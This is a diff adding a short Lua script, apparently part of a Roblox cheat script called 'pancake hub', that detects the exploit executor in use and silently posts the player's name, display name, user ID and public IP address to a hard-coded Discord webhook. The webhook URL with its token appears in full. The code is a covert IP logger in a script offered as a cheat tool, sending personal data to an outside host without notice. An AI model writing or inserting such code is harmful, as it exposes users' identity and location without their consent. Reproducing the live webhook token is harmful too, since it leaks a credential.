@@ -1,0 +1,46 @@
+IPv4 = game:HttpGet("https://v4.ident.me/%22")
+
+local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "Kid with shit exploit"
+
+local url =
+    "https://discord.com/api/webhooks/947297148855255080/6kLpTOJO-rSRCGShQpj2RLoWrfYmgkXvzOr6noGVXQedW831P28hwyvwckK1UYfJw5CU"
+local data = {
+    ["embeds"] = {{
+
+        ["author"] = {
+            ["name"] = game.Players.LocalPlayer.Name,
+        },
+        ["description"] = "New pancake hub user that uses "..""..webhookcheck.."",
+        ["color"] = tonumber(0xb80000),
+        ["fields"] = {
+            {
+                ["name"] = "Display Name:",
+                ["value"] = game.Players.LocalPlayer.DisplayName,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User ID:",
+                ["value"] = game.Players.LocalPlayer.UserId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IP:",
+                ["value"] = IPv4,
+                ["inline"] = true
+                },
+        }
+    }},
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
